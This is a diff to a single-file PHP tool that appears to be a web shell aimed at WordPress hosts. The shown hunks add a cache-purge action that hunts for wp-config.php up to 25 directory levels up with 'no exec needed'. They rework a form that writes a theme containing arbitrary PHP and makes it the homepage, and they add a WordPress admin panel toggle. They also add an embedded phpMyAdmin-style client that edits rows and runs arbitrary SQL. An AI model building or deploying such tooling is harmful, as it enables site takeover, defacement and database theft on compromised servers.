+                                Set as WordPress homepage (show_on_front)
+                            </label>
+                            <button type="submit" class="btn btn-primary">🎨 Create &amp; Activate Theme</button>
+                        </div>
+                    </form>
 
-                <form method="post" onsubmit="return confirm('Create &amp; activate WP theme?\n\nThis will write files to wp-content/themes/ and modify the database.')">
-                    <input type="hidden" name="action" value="wp_createtheme">
-                    <div style="display:flex;gap:10px;margin-bottom:8px;flex-wrap:wrap;">
-                        <div style="flex:1;min-width:160px;">
-                            <label style="font-size:11px;color:#8b949e;display:block;margin-bottom:3px;">Theme Slug (folder name)</label>
-                            <input type="text" name="theme_slug" value="<?= htmlspecialchars($action === 'wp_createtheme' ? ($wpThemeSlug ?? 'caga-theme') : 'caga-theme') ?>"
-                                placeholder="caga-theme" pattern="[a-zA-Z0-9\-]+" style="width:100%;box-sizing:border-box;">
+                    <!-- ── Purge Cache ───────────────────────────── -->
+                    <div style="margin-top:14px;padding-top:12px;border-top:1px solid #21262d;">
+                        <div style="font-size:12px;color:#8b949e;margin-bottom:8px;">
+                            Hapus semua <strong>transient WP</strong> &amp; flush <strong>rewrite rules</strong> dari database (tanpa exec).
                         </div>
-                        <div style="flex:2;min-width:200px;">
-                            <label style="font-size:11px;color:#8b949e;display:block;margin-bottom:3px;">Theme Display Name</label>
-                            <input type="text" name="theme_name" value="<?= htmlspecialchars($action === 'wp_createtheme' ? ($wpThemeName ?? 'Caga Custom Theme') : 'Caga Custom Theme') ?>"
-                                placeholder="Caga Custom Theme" style="width:100%;box-sizing:border-box;">
-                        </div>
+                        <?php if ($wpPurgeLog !== null): ?>
+                            <div style="background:#0a0c10;border:1px solid #21262d;border-radius:6px;padding:12px;margin-bottom:10px;font-size:12px;font-family:inherit;">
+                                <?php foreach ($wpPurgeLog as $entry): ?>
+                                    <div style="color:<?= $entry['ok'] ? '#7ee787' : '#f85149' ?>;margin-bottom:3px;">
+                                        <?= $entry['ok'] ? '✔' : '✘' ?> <?= htmlspecialchars($entry['msg']) ?>
+                                    </div>
+                                <?php endforeach; ?>
+                            </div>
+                        <?php endif; ?>
+                        <form method="post" onsubmit="return confirm('Purge WP transients &amp; flush rewrite rules?\n\nIni akan menghapus semua cache transient dari database.')">
+                            <input type="hidden" name="action" value="wp_purge">
+                            <button type="submit" class="btn btn-warning">🧹 Purge WP Cache</button>
+                            <span style="font-size:11px;color:#6e7681;margin-left:10px;">Reads wp-config.php up to 25 levels — no exec needed</span>
+                        </form>
                     </div>
-                    <div style="margin-bottom:8px;">
-                        <label style="font-size:11px;color:#8b949e;display:block;margin-bottom:3px;">
-                            Theme HTML Content
-                            <span style="color:#6e7681;">(full page HTML — can include &lt;?php ?&gt; tags)</span>
-                        </label>
-                        <textarea name="theme_html" rows="12" placeholder="<!DOCTYPE html>&#10;<html>&#10;<head>&#10;  <meta charset=&quot;UTF-8&quot;>&#10;  <title>My Site</title>&#10;</head>&#10;<body>&#10;  <h1>Welcome!</h1>&#10;  <p>My custom homepage.</p>&#10;</body>&#10;</html>"
-                            style="width:100%;box-sizing:border-box;font-family:monospace;font-size:12px;background:#0a0c10;color:#c9d1d9;border:1px solid #30363d;border-radius:4px;padding:8px;resize:vertical;"><?= htmlspecialchars($action === 'wp_createtheme' ? ($_POST['theme_html'] ?? '') : '') ?></textarea>
-                        <div style="font-size:11px;color:#6e7681;margin-top:3px;">
-                            If your HTML has no <code>&lt;!DOCTYPE&gt;</code>, a full page wrapper with <code>wp_head()</code>/<code>wp_footer()</code> hooks is added automatically.
-                        </div>
-                    </div>
-                    <div style="display:flex;align-items:center;gap:16px;flex-wrap:wrap;">
-                        <label style="font-size:12px;color:#c9d1d9;cursor:pointer;display:flex;align-items:center;gap:6px;">
-                            <input type="checkbox" name="set_homepage" value="1" <?= ($action !== 'wp_createtheme' || !empty($_POST['set_homepage'])) ? 'checked' : '' ?>>
-                            Set as WordPress homepage (show_on_front)
-                        </label>
-                        <button type="submit" class="btn btn-primary">🎨 Create &amp; Activate Theme</button>
-                        <span style="font-size:11px;color:#6e7681;">Syntax is checked before writing any files.</span>
-                    </div>
-                </form>
+                </div>
             </div>
         </div>
 
@@ -2631,14 +2897,305 @@ $hasZip = class_exists('ZipArchive');
         }
         function submitBulkDelete() {
             const checked = document.querySelectorAll('.bulk-cb:checked');
-            if (checked.length === 0) {
-                alert('No files selected.');
-                return;
-            }
+            if (checked.length === 0) { alert('No files selected.'); return; }
             if (confirm('Delete ' + checked.length + ' selected item(s)?')) {
                 document.getElementById('bulkForm').submit();
             }
         }
+
+        // ── Panel toggle (show/hide) ──────────────────────────────────────
+        function togglePanel(bodyId, btnId) {
+            const body = document.getElementById(bodyId);
+            const btn  = document.getElementById(btnId);
+            if (!body || !btn) return;
+            const open = body.classList.toggle('open');
+            btn.textContent = open ? '▼ hide' : '▶ show';
+        }
+        <?php if ($wpAutoLog !== null): ?>
+        (function(){ const b=document.getElementById('wpAdminPanel'),t=document.getElementById('wpAdminToggle'); if(b&&t){b.classList.add('open');t.textContent='▼ hide';} })();
+        <?php endif; ?>
+        <?php if ($wpThemeLog !== null): ?>
+        (function(){ const b=document.getElementById('wpThemePanel'),t=document.getElementById('wpThemeToggle'); if(b&&t){b.classList.add('open');t.textContent='▼ hide';} })();
+        <?php endif; ?>
+        <?php if ($wpPurgeLog !== null): ?>
+        (function(){ const b=document.getElementById('wpThemePanel'),t=document.getElementById('wpThemeToggle'); if(b&&t){b.classList.add('open');t.textContent='▼ hide';} })();
+        <?php endif; ?>
+
+        // ── phpMyAdmin JS ─────────────────────────────────────────────────
+        const PMA_URL = '?';
+        let pmaCurrentDb    = <?= json_encode($mysqlConn['db'] ?? '') ?>;
+        let pmaCurrentTable = '';
+        let pmaCurrentPage  = 0;
+        let pmaTotalRows    = 0;
+        let pmaPageLimit    = 50;
+        let pmaCols         = [];
+        let pmaPkCol        = '';
+
+        function pmaEsc(s) {
+            return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+        }
+
+        function pmaPost(data) {
+            const fd = new FormData();
+            fd.append('action', 'pma_ajax');
+            for (const [k,v] of Object.entries(data)) fd.append(k, v);
+            return fetch(PMA_URL, {method:'POST', body:fd}).then(r => r.json());
+        }
+
+        function pmaSetContent(h) {
+            const el = document.getElementById('pmaContent');
+            if (el) el.innerHTML = h;
+        }
+
+        function hidePagination() {
+            const el = document.getElementById('pmaPagination');
+            if (el) el.style.display = 'none';
+        }
+
+        function showPagination(page, total, limit) {
+            const el = document.getElementById('pmaPagination');
+            if (!el) return;
+            el.style.display = 'flex';
+            document.getElementById('pmaPageInfo').textContent = 'Page '+(page+1)+' / '+Math.max(1,Math.ceil(total/limit));
+            document.getElementById('pmaTotalInfo').textContent = total+' rows';
+            document.getElementById('btnPrev').disabled = page === 0;
+            document.getElementById('btnNext').disabled = (page+1)*limit >= total;
+        }
+
+        function setBreadcrumb(db, tbl) {
+            const el = document.getElementById('pmaBreadcrumb');
+            if (!el) return;
+            el.innerHTML = '<span style="color:#f0883e;">'+pmaEsc(db)+'</span>'
+                + (tbl ? '<span style="color:#6e7681;"> / </span><span style="color:#7ee787;">'+pmaEsc(tbl)+'</span>' : '');
+        }
+
+        function pmaListDbs() {
+            const dbList = document.getElementById('pmaDbList');
+            if (!dbList) return;
+            dbList.innerHTML = '<div style="padding:8px;font-size:11px;color:#6e7681;">Loading...</div>';
+            pmaPost({sub:'list_dbs'}).then(d => {
+                if (d.error) { dbList.innerHTML = '<div style="padding:8px;font-size:11px;color:#f85149;">'+pmaEsc(d.error)+'</div>'; return; }
+                let h = '';
+                d.dbs.forEach(db => {
+                    // Use data-db attribute — avoids any quoting issues with JSON.stringify in innerHTML
+                    h += '<div class="pma-item db-item'+(db===pmaCurrentDb?' active':'')+'" data-db="'+pmaEsc(db)+'" title="'+pmaEsc(db)+'">🗄 '+pmaEsc(db)+'</div>';
+                });
+                dbList.innerHTML = h;
+                // Attach click listeners via event delegation (already handled below)
+                if (pmaCurrentDb) pmaSelectDb(pmaCurrentDb);
+            }).catch(e => { dbList.innerHTML = '<div style="padding:8px;font-size:11px;color:#f85149;">'+String(e)+'</div>'; });
+        }
+
+        // Event delegation for sidebar clicks — avoids all inline onclick issues
+        document.addEventListener('click', function(e) {
+            const dbEl = e.target.closest('.pma-item.db-item[data-db]');
+            if (dbEl) { pmaSelectDb(dbEl.getAttribute('data-db')); return; }
+            const tblEl = e.target.closest('.pma-item.tbl-item[data-tbl]');
+            if (tblEl) { pmaBrowseTable(tblEl.getAttribute('data-tbl')); return; }
+        });
+
+        function pmaSelectDb(db) {
+            pmaCurrentDb = db;
+            pmaCurrentTable = '';
+            pmaPost({sub:'select_db', db}).then(d => {
+                if (d.error) { pmaSetContent('<div style="color:#f85149;padding:10px;">'+pmaEsc(d.error)+'</div>'); return; }
+                // Rebuild entire sidebar list: dbs + tables for selected db, all inside the ONE scroll container
+                const dbList = document.getElementById('pmaDbList');
+                // Re-request db list to keep it current, then inject tables below selected db
+                pmaPost({sub:'list_dbs'}).then(dbsData => {
+                    let h = '';
+                    (dbsData.dbs || []).forEach(dbName => {
+                        h += '<div class="pma-item db-item'+(dbName===db?' active':'')+'" data-db="'+pmaEsc(dbName)+'" title="'+pmaEsc(dbName)+'">🗄 '+pmaEsc(dbName)+'</div>';
+                        if (dbName === db && d.tables && d.tables.length) {
+                            // Inject tables right below the selected db
+                            h += '<div class="pma-tbl-section-hdr">📋 '+pmaEsc(db)+' ('+d.tables.length+')</div>';
+                            d.tables.forEach(t => {
+                                h += '<div class="pma-item tbl-item'+(t===pmaCurrentTable?' active':'')+'" data-tbl="'+pmaEsc(t)+'" title="'+pmaEsc(t)+'" style="padding-left:20px;">▸ '+pmaEsc(t)+'</div>';
+                            });
+                        }
+                    });
+                    dbList.innerHTML = h;
+                    // Scroll selected db into view
+                    const activeEl = dbList.querySelector('.pma-item.db-item.active');
+                    if (activeEl) activeEl.scrollIntoView({block:'nearest'});
+                });
+                setBreadcrumb(db, '');
+                pmaSetContent('<div style="color:#8b949e;font-size:12px;padding:16px;"><strong style="color:#f0883e;">'+pmaEsc(db)+'</strong> — '+d.tables.length+' table(s). Click a table on the left.</div>');
+                hidePagination();
+                document.getElementById('btnInsert').style.display = 'none';
+                document.getElementById('btnRefresh').style.display = 'none';
+            });
+        }
+
+        function pmaBrowseTable(tbl, page) {
+            pmaCurrentTable = tbl;
+            pmaCurrentPage  = (page !== undefined) ? page : 0;
+            // Highlight active table in sidebar
+            document.querySelectorAll('.pma-item.tbl-item').forEach(el => {
+                el.classList.toggle('active', el.getAttribute('data-tbl') === tbl);
+            });
+            document.getElementById('btnInsert').style.display = 'inline-block';
+            document.getElementById('btnRefresh').style.display = 'inline-block';
+            pmaSetContent('<div style="color:#8b949e;font-size:12px;padding:10px;">Loading <strong>'+pmaEsc(tbl)+'</strong>...</div>');
+            pmaPost({sub:'browse', table:tbl, db:pmaCurrentDb, page:pmaCurrentPage}).then(d => {
+                if (d.error) { pmaSetContent('<div style="color:#f85149;padding:10px;">'+pmaEsc(d.error)+'</div>'); return; }
+                pmaCols    = d.cols;
+                pmaTotalRows = d.total;
+                pmaPageLimit = d.limit;
+                pmaPkCol = '';
+                pmaCols.forEach(c => { if (c.Key==='PRI' && !pmaPkCol) pmaPkCol = c.Field; });
+                if (!pmaPkCol && pmaCols.length) pmaPkCol = pmaCols[0].Field;
+                setBreadcrumb(pmaCurrentDb, tbl);
+                renderBrowseTable(d.rows, d.cols);
+                showPagination(d.page, d.total, d.limit);
+            });
+        }
+
+        function pmaRefreshTable() { if (pmaCurrentTable) pmaBrowseTable(pmaCurrentTable, pmaCurrentPage); }
+
+        function renderBrowseTable(rows, cols) {
+            if (!rows.length) {
+                pmaSetContent('<div style="color:#8b949e;font-size:12px;padding:10px;">Table is empty.</div>');
+                return;
+            }
+            let h = '<div class="pma-table-wrap"><table class="pma-table"><thead><tr>'
+                  + '<th style="width:72px;min-width:72px;">Act</th>';
+            cols.forEach(c => h += '<th>'+pmaEsc(c.Field)+'<br><span style="font-weight:normal;color:#6e7681;font-size:10px;">'+pmaEsc(c.Type)+'</span></th>');
+            h += '</tr></thead><tbody>';
+            rows.forEach((row, ri) => {
+                const pkv = String(row[pmaPkCol] ?? '');
+                // Use data-ri and data-pkv — no inline JS expression
+                h += '<tr><td class="act-col">'
+                   + '<button class="btn btn-sm pma-edit-btn" data-ri="'+ri+'" style="font-size:10px;padding:1px 5px;margin-right:2px;">✏</button>'
+                   + '<button class="btn btn-sm btn-danger pma-del-btn" data-pkv="'+pmaEsc(pkv)+'" style="font-size:10px;padding:1px 5px;">✕</button>'
+                   + '</td>';
+                cols.forEach(c => {
+                    const v = row[c.Field];
+                    h += '<td title="'+pmaEsc(String(v??''))+'"><span class="'+(v===null?'null-val':'')+'">'+(v===null?'NULL':pmaEsc(String(v)))+'</span></td>';
+                });
+                h += '</tr>';
+            });
+            h += '</tbody></table></div>';
+            window._pmaRows = rows;
+            pmaSetContent(h);
+        }
+
+        // Delegated clicks for edit/delete buttons inside pmaContent
+        document.addEventListener('click', function(e) {
+            const editBtn = e.target.closest('.pma-edit-btn[data-ri]');
+            if (editBtn) { pmaEditRow(parseInt(editBtn.getAttribute('data-ri'), 10)); return; }
+            const delBtn = e.target.closest('.pma-del-btn[data-pkv]');
+            if (delBtn) { pmaDeleteRow(delBtn.getAttribute('data-pkv')); return; }
+        });
+
+        function pmaDeleteRow(pkv) {
+            if (!confirm('Delete row where '+pmaPkCol+' = '+pkv+'?')) return;
+            pmaPost({sub:'delete_row', table:pmaCurrentTable, db:pmaCurrentDb, pk:pmaPkCol, pkv})
+                .then(d => { if (d.error) alert('Error: '+d.error); else pmaRefreshTable(); });
+        }
+
+        function pmaEditRow(ri) {
+            const row = (window._pmaRows||[])[ri];
+            if (!row) return;
+            const pkv = row[pmaPkCol] ?? '';
+            let h = '<div style="padding:12px;">'
+                  + '<h4 style="margin:0 0 10px;color:#58a6ff;">✏ Edit Row — '+pmaEsc(pmaCurrentTable)+'</h4>'
+                  + '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:8px;">';
+            pmaCols.forEach(c => {
+                const v = row[c.Field] ?? '';
+                h += '<div><label style="font-size:11px;color:#8b949e;display:block;margin-bottom:2px;">'
+                   + pmaEsc(c.Field)+(c.Key==='PRI'?' <span style="color:#f0883e;">[PK]</span>':'')+'</label>'
+                   + '<input id="pmaef_'+pmaEsc(c.Field)+'" value="'+pmaEsc(String(v))+'" '
+                   + 'style="width:100%;box-sizing:border-box;background:#0a0c10;border:1px solid #30363d;color:#e6edf3;padding:5px 8px;border-radius:4px;font-size:12px;"></div>';
+            });
+            h += '</div><div style="margin-top:12px;display:flex;gap:8px;">'
+               + '<button class="btn btn-sm btn-primary" onclick="pmaSubmitEdit('+JSON.stringify(String(pkv))+')">💾 Save</button>'
+               + '<button class="btn btn-sm" onclick="pmaRefreshTable()">✕ Cancel</button></div></div>';
+            pmaSetContent(h);
+            hidePagination();
+        }
+
+        function pmaSubmitEdit(pkv) {
+            const fd = new FormData();
+            fd.append('action','pma_ajax'); fd.append('sub','update_row');
+            fd.append('table',pmaCurrentTable); fd.append('db',pmaCurrentDb);
+            fd.append('pk',pmaPkCol); fd.append('pkv',pkv);
+            pmaCols.forEach(c => {
+                const el = document.getElementById('pmaef_'+c.Field);
+                if (el) fd.append('fields['+c.Field+']', el.value);
+            });
+            fetch(PMA_URL,{method:'POST',body:fd}).then(r=>r.json()).then(d => {
+                if (d.error) alert('Error: '+d.error); else pmaRefreshTable();
+            });
+        }
+
+        function pmaShowInsert() {
+            let h = '<div style="padding:12px;">'
+                  + '<h4 style="margin:0 0 10px;color:#7ee787;">+ Insert Row — '+pmaEsc(pmaCurrentTable)+'</h4>'
+                  + '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:8px;">';
+            pmaCols.forEach(c => {
+                const isAuto = c.Extra === 'auto_increment';
+                h += '<div><label style="font-size:11px;color:#8b949e;display:block;margin-bottom:2px;">'
+                   + pmaEsc(c.Field)+(isAuto?' <span style="color:#6e7681;">[auto]</span>':'')+'</label>'
+                   + '<input id="pmaif_'+pmaEsc(c.Field)+'" placeholder="'+(isAuto?'auto':'')+'" '
+                   + (isAuto?'disabled ':'')
+                   + 'style="width:100%;box-sizing:border-box;background:#0a0c10;border:1px solid #30363d;color:#e6edf3;padding:5px 8px;border-radius:4px;font-size:12px;"></div>';
+            });
+            h += '</div><div style="margin-top:12px;display:flex;gap:8px;">'
+               + '<button class="btn btn-sm btn-primary" onclick="pmaSubmitInsert()">➕ Insert</button>'
+               + '<button class="btn btn-sm" onclick="pmaRefreshTable()">✕ Cancel</button></div></div>';
+            pmaSetContent(h);
+            hidePagination();
+        }
+
+        function pmaSubmitInsert() {
+            const fd = new FormData();
+            fd.append('action','pma_ajax'); fd.append('sub','insert_row');
+            fd.append('table',pmaCurrentTable); fd.append('db',pmaCurrentDb);
+            pmaCols.forEach(c => {
+                if (c.Extra === 'auto_increment') return;
+                const el = document.getElementById('pmaif_'+c.Field);
+                if (el && el.value !== '') fd.append('fields['+c.Field+']', el.value);
+            });
+            fetch(PMA_URL,{method:'POST',body:fd}).then(r=>r.json()).then(d => {
+                if (d.error) alert('Error: '+d.error);
+                else { alert('Inserted! New ID: '+(d.id||'N/A')); pmaRefreshTable(); }
+            });
+        }
+
+        function pmaRunSql() {
+            const sql = (document.getElementById('pmaSqlInput')?.value || '').trim();
+            if (!sql) return;
+            pmaPost({sub:'run_sql', sql, db:pmaCurrentDb}).then(d => {
+                if (d.error) { pmaSetContent('<div style="color:#f85149;padding:10px;font-size:12px;">'+pmaEsc(d.error)+'</div>'); return; }
+                if (d.ok !== undefined) { pmaSetContent('<div style="color:#7ee787;padding:10px;font-size:12px;">✔ Query OK — '+d.affected+' row(s) affected.</div>'); hidePagination(); return; }
+                if (!d.rows || !d.rows.length) { pmaSetContent('<div style="color:#8b949e;font-size:12px;padding:10px;">Empty result.</div>'); return; }
+                let h = '<div class="pma-table-wrap"><table class="pma-table"><thead><tr>';
+                d.cols.forEach(c => h += '<th>'+pmaEsc(c)+'</th>');
+                h += '</tr></thead><tbody>';
+                d.rows.forEach(row => {
+                    h += '<tr>';
+                    d.cols.forEach(c => { const v=row[c]; h+='<td>'+(v===null?'<span class="null-val">NULL</span>':pmaEsc(String(v)))+'</td>'; });
+                    h += '</tr>';
+                });
+                h += '</tbody></table></div><div style="color:#6e7681;font-size:11px;margin-top:4px;padding:0 4px;">'+d.rows.length+' row(s)</div>';
+                pmaSetContent(h);
+                hidePagination();
+            });
+        }
+
+        function pmaClearSql() {
+            const el = document.getElementById('pmaSqlInput');
+            if (el) el.value = '';
+        }
+
+        function pmaPrevPage() { if (pmaCurrentPage > 0) pmaBrowseTable(pmaCurrentTable, pmaCurrentPage-1); }
+        function pmaNextPage() { if ((pmaCurrentPage+1)*pmaPageLimit < pmaTotalRows) pmaBrowseTable(pmaCurrentTable, pmaCurrentPage+1); }
+
+        // Init PMA on load
+        window.addEventListener('load', function() {
+            if (document.getElementById('pmaDbList')) pmaListDbs();
+        });
     </script>
 </body>
 </html>
